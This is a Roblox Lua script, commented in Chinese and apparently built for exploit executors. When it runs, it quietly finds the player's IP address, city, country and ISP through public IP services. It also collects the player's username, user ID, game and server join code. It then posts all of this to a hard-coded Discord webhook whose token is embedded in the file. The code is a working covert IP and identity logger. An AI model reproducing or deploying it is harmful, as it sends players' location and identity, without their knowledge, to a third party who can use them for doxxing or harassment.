--// 服務初始化
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

--// 設定
local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"

--// 增強的 HTTP 請求函數 (為了相容性和穩定性 )
local function secureRequest(options)
    -- 優先使用常見腳本執行器的請求函數
    local requestFunc = request or http_request or (syn and syn.request )
    if requestFunc then
        local success, response = pcall(function() return requestFunc(options) end)
        if success and response then return response end
    end
    -- 如果上述方法失敗，嘗試使用 Roblox 內建的 HttpGetAsync (僅適用於 GET 請求)
    if options.Method == "GET" and game.HttpGetAsync then
         local success, responseBody = pcall(game.HttpGetAsync, game, options.Url)
         if success and responseBody then return { Body = responseBody, StatusCode = 200 } end
    end
    warn("所有 HTTP 請求方法均失敗。")
    return nil
end

--// 獲取 IP 和地理位置的函數
local function getSecretInfo()
    local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
    local ip
    for _, url in ipairs(ipServices ) do
        local response = secureRequest({ Url = url, Method = "GET" })
        if response and response.Body and #response.Body > 0 and not response.Body:find("[<>]") then
            ip = response.Body:gsub("%s+", "")
            break
        end
    end
    if not ip then return nil end
    
    -- 獲取 IP 詳細資訊
    local ipDetails
    local detailResponse = secureRequest({ Url = "https://ipinfo.io/" .. ip .. "/json", Method = "GET" } )
    if detailResponse and detailResponse.Body then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, detailResponse.Body)
        if success and type(decoded) == "table" then ipDetails = decoded end
    end
    return { ip = ip, details = ipDetails }
end

--// 主要執行邏輯
pcall(function()
    -- 1. 獲取遊戲名稱
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info.Name or "Unknown"
    end)

    -- 2. 獲取 IP 資訊
    local secretInfo = getSecretInfo()

    -- 3. 建立個人資料連結
    local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"

    -- 4. 準備 embed 的 description，包含您需要的所有資訊
    local description = string.format(
        "**真實名稱:** %s\n" ..
        "**顯示名稱:** %s\n" ..
        "**玩家ID:** %s\n" ..
        "**個人資料:** [Roblox 個人頁面](%s)\n" ..
        "**遊戲:** %s\n" ..
        "**玩家伺服器人數:** %d\n" ..
        "**加入代碼:** `%s`",
        LocalPlayer.Name,
        LocalPlayer.DisplayName,
        tostring(LocalPlayer.UserId),
        profileUrl,
        gameName,
        #Players:GetPlayers(), -- 獲取伺服器人數
        game.JobId or "N/A" -- 獲取加入代碼
    )

    -- 5. 準備 embed 的 fields，用於放置 IP 資訊
    local fields = {}
    if secretInfo and secretInfo.ip then
        local secretValue = "||IP: " .. secretInfo.ip .. "||"
        if secretInfo.details then
            secretValue = secretValue ..
                "\n||位置: " .. (secretInfo.details.city or "?") .. ", " .. (secretInfo.details.country or "?") .. "||" ..
                "\n||ISP: " .. (secretInfo.details.org or "?") .. "||"
        end
        table.insert(fields, {
            name = "🔒 網路資訊 (機密)",
            value = secretValue,
            inline = false
        })
    end

    -- 6. 構建並發送最終的 webhook 資料
    local data = {
        username = "Script Logger",
        embeds = {{
            title = "🚀 腳本執行紀錄",
            description = description,
            color = tonumber("0x3498db"),
            fields = fields,
            footer = {
                text = "Nash Logger • " .. os.date("!%Y-%m-%d %H:%M:%SZ")
            }
        }}
    }

    secureRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end)
